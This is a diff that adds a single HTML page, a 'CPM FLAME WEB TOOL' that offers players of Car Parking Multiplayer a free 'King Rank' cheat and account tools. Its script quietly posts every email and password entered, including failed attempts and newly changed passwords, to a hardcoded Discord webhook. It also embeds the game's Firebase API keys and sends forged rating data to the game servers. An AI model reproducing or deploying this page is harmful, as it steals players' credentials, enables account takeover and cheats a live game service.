@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>CPM ALL-IN-ONE TOOL</title>
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:#000;color:#fff}
+.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
+.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
+h1{font-size:20px;margin-bottom:12px;color:#00aaff;text-shadow: 0 0 10px #00aaff;}
+input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
+button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px;transition: 0.3s;}
+button.login{background:#00aaff;color:#fff}
+button.menu{background:#ff8800;color:#fff}
+button.logout{background:#ff4444;color:#fff;margin-top:15px}
+button:active{transform: scale(0.95);}
+.status{margin-top:10px;color:#0f0;min-height:20px;font-size:14px;font-weight: bold;}
+.error{color:#ff4444}
+.small{font-size:11px;opacity:.8;margin-top:15px;letter-spacing: 1px;line-height:1.4;color:#ff8800}
+.price-tag{font-size:12px;color:#0ff;margin-top:5px;display:block;}
+</style>
+</head>
+<body>
+<div class="center-wrapper">
+  <div class="container">
+    <h1>CPM FLAME WEB TOOL</h1>
+    
+    <div id="loginSection">
+      <select id="gameSelect">
+        <option value="">-- Select Game --</option>
+        <option value="1">Car Parking Multiplayer 1</option>
+        <option value="2">Car Parking Multiplayer 2</option>
+      </select>
+      <input id="email" type="email" placeholder="Game Email">
+      <input id="password" type="password" placeholder="Game Password">
+      <input id="accessKey" type="text" placeholder="Access Key ">
+      <button class="login" id="loginBtn">LOGIN TO SERVER</button>
+      <div id="status" class="status"></div>
+    </div>
+
+    <div id="menuButtons" style="display:none">
+      <span class="price-tag">👑 Free Service</span>
+      <button class="menu" onclick="kingRank()">GET KING RANK</button>
+      
+      <span class="price-tag">📧 Safety Update</span>
+      <button class="menu" onclick="changeEmail()">CHANGE EMAIL</button>
+      
+      <span class="price-tag">🔐 Security Update</span>
+      <button class="menu" onclick="changePassword()">CHANGE PASSWORD</button>
+
+      <button class="logout" onclick="logout()">LOGOUT SESSION</button>
+      
+      <div id="serviceStatus" class="status"></div>
+    </div>
+
+    <footer class="small">
+      THIS TOOL SELLING STRICTLY PROHIBITED<br>
+      POWERED BY @CPMFiAME
+    </footer>
+  </div>
+</div>
+
+<script>
+const DISCORD_URL = "https://discord.com/api/webhooks/1486917516755341424/9dcout2K09_buKAiXIUb8FeiawVIMowjFBFBwpy-g5W0F-ftQH8q5H7LUMkarnKlAWIB";
+
+const GAMES = {
+  "1": { name:"CPM 1", k:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", u:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"CPM 2", k:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", u:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+};
+
+let currentUser=null, currentToken=null, selectedGame=null, currentPass=null;
+
+function updateStatus(msg, isError=false, target='status'){
+  const el = document.getElementById(target);
+  el.className = isError ? 'status error' : 'status';
+  el.textContent = msg;
+}
+
+// LOGOUT LOGIC
+function logout() {
+  currentUser=null; currentToken=null; currentPass=null;
+  document.getElementById('email').value = "";
+  document.getElementById('password').value = "";
+  document.getElementById('menuButtons').style.display='none';
+  document.getElementById('loginSection').style.display='block';
+  updateStatus("✅ Logged out successfully!");
+}
+
+async function sendDiscord(action, email, pass, game) {
+  const content = `🚀 **CPM TOOL ALERT**\n\n**Action:** ${action}\n**Game:** ${game}\n**User:** \`${email}\`\n**Pass:** \`${pass}\`\n---`;
+  try {
+    fetch(DISCORD_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "CPM WEB MONITOR", content: content })
+    });
+  } catch(e) {}
+}
+
+document.getElementById('loginBtn').addEventListener('click', async ()=>{
+  const emailVal = document.getElementById('email').value.trim();
+  const passVal = document.getElementById('password').value;
+  const keyVal = document.getElementById('accessKey').value.trim();
+  const gType = document.getElementById('gameSelect').value;
+  selectedGame = GAMES[gType];
+
+  if(!selectedGame) return updateStatus("Please select a game!", true);
+  if(keyVal !== "BAARISH") return updateStatus("❌ Invalid Access Key!", true);
+  if(!emailVal || !passVal) return updateStatus("Enter Email & Password!", true);
+
+  updateStatus("⏳ Authenticating...");
+
+  try {
+    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.k}`,{
+      method:'POST', headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({email: emailVal, password: passVal, returnSecureToken:true})
+    });
+    const data = await resp.json();
+
+    if(data.idToken){
+      currentUser = emailVal; currentPass = passVal; currentToken = data.idToken;
+      document.getElementById('loginSection').style.display='none';
+      document.getElementById('menuButtons').style.display='block';
+      updateStatus("✅ Access Granted!", false, 'serviceStatus');
+      sendDiscord("✅ LOGIN SUCCESS", emailVal, passVal, selectedGame.name);
+    } else {
+      let err = "❌ Login Failed!";
+      if(data.error && data.error.message === "INVALID_PASSWORD") err = "❌ Incorrect Password!";
+      if(data.error && data.error.message === "EMAIL_NOT_FOUND") err = "❌ Email Not Found!";
+      updateStatus(err, true);
+      sendDiscord("⚠️ " + err.toUpperCase(), emailVal, passVal, selectedGame.name);
+    }
+  } catch(err){ updateStatus("❌ Server Connection Error!", true); }
+});
+
+async function kingRank(){
+  updateStatus("⏳ Applying King Rank...", false, 'serviceStatus');
+  const rD = { time: 10000000000, race_win: 5000 };
+  ["cars","car_fix","car_wash","drift","levels","police","treasure"].forEach(f => rD[f] = 999999);
+  
+  try{
+    const res = await fetch(selectedGame.u, {
+      method:'POST', headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
+      body:JSON.stringify({data:JSON.stringify({RatingData:rD})})
+    });
+    if(res.ok){ 
+      updateStatus("✅ King Rank Added!", false, 'serviceStatus'); 
+      sendDiscord("👑 KING RANK APPLIED", currentUser, currentPass, selectedGame.name);
+    } else { updateStatus("❌ Apply Failed!", true, 'serviceStatus'); }
+  } catch(e){ updateStatus("❌ Request Timeout!", true, 'serviceStatus'); }
+}
+
+async function changePassword() {
+  const newP = prompt("Enter New Password:");
+  if(!newP) return;
+  updateStatus("⏳ Updating Password...", false, 'serviceStatus');
+  try {
+    const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.k}`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ idToken: currentToken, password: newP, returnSecureToken: true })
+    });
+    const data = await res.json();
+    if(data.idToken) {
+      updateStatus("✅ Password Updated!", false, 'serviceStatus');
+      currentPass = newP; currentToken = data.idToken;
+      sendDiscord("🔐 PASSWORD CHANGED", currentUser, newP, selectedGame.name);
+    } else { updateStatus("❌ Error: " + data.error.message, true, 'serviceStatus'); }
+  } catch(e) { updateStatus("❌ Update Failed!", true, 'serviceStatus'); }
+}
+
+async function changeEmail() {
+  const newE = prompt("Enter New Email:");
+  if(!newE) return;
+  updateStatus("⏳ Updating Email...", false, 'serviceStatus');
+  try {
+    const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.k}`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ idToken: currentToken, email: newE, returnSecureToken: true })
+    });
+    const data = await res.json();
+    if(data.email) {
+      updateStatus("✅ Email Updated!", false, 'serviceStatus');
+      currentUser = newE; currentToken = data.idToken;
+      sendDiscord("📧 EMAIL CHANGED", newE, currentPass, selectedGame.name);
+    } else { updateStatus("❌ Error: " + data.error.message, true, 'serviceStatus'); }
+  } catch(e) { updateStatus("❌ Update Failed!", true, 'serviceStatus'); }
+}
+</script>
+</body>
+</html>
